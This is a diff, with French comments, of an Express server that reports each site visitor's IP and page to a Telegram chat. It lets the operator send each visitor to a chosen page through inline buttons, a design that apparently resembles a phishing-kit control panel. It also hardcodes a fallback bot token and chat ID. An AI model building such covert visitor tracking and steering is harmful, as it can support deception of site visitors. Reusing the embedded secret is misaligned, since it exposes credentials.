@@ -4,16 +4,16 @@ const path = require("path");
 
 const app = express();
 app.use(express.json());
-app.use(express.static(path.join(__dirname, "frontend"))); // dossier frontend pour HTML/JS/CSS
+app.use(express.static(path.join(__dirname, "frontend"))); // dossier frontend
 
-// Variables d'environnement
+// Variables d'environnement (mettre dans Render)
 const BOT_TOKEN = process.env.BOT_TOKEN || "8208574276:AAF96EdGjUrQqkRrb31QjzqVJ9uMB5c";
 const CHAT_ID = process.env.CHAT_ID || "7747778364";
 const BASE_URL = process.env.BASE_URL || "https://basketnew.onrender.com";
 
-let userCommands = {}; // pour stocker les commandes depuis Telegram
+let userCommands = {}; // stocke la commande Telegram pour chaque visiteur
 
-// Fonction pour envoyer un message Telegram avec clavier inline
+// Fonction pour envoyer un message Telegram
 async function sendTelegramMessage(text, keyboard) {
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -27,16 +27,15 @@ async function sendTelegramMessage(text, keyboard) {
       }),
     });
   } catch (err) {
-    console.error("Erreur envoi Telegram:", err);
+    console.error("Erreur Telegram:", err);
   }
 }
 
-// Route POST /visit pour chaque visite de page
+// Route pour recevoir chaque visite
 app.post("/visit", async (req, res) => {
   const { visitorId, page } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-  // Clavier inline
   const keyboard = {
     inline_keyboard: [[
       { text: "🏠 Accueil", callback_data: `index_${visitorId}` },
@@ -52,7 +51,7 @@ app.post("/visit", async (req, res) => {
   res.json({ success: true });
 });
 
-// Route GET /get-command pour récupérer la commande Telegram
+// Route pour récupérer la commande Telegram
 app.get("/get-command", (req, res) => {
   const { visitorId } = req.query;
   const command = userCommands[visitorId] || null;
@@ -60,7 +59,7 @@ app.get("/get-command", (req, res) => {
   res.json({ command });
 });
 
-// Route POST /webhook pour gérer les callbacks Telegram
+// Route pour gérer les callbacks Telegram
 app.post("/webhook", async (req, res) => {
   const cb = req.body.callback_query;
   if (!cb) return res.sendStatus(200);
@@ -68,6 +67,7 @@ app.post("/webhook", async (req, res) => {
   const [page, visitorId] = cb.data.split("_");
   userCommands[visitorId] = page;
 
+  // Réponse immédiate au callback
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -82,7 +82,7 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, async () => {
   console.log(`✅ Serveur actif sur le port ${PORT}`);
 
-  // Enregistrement automatique du webhook
+  // Configurer le webhook Telegram
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${BASE_URL}/webhook`);
     console.log("📡 Webhook Telegram configuré !");
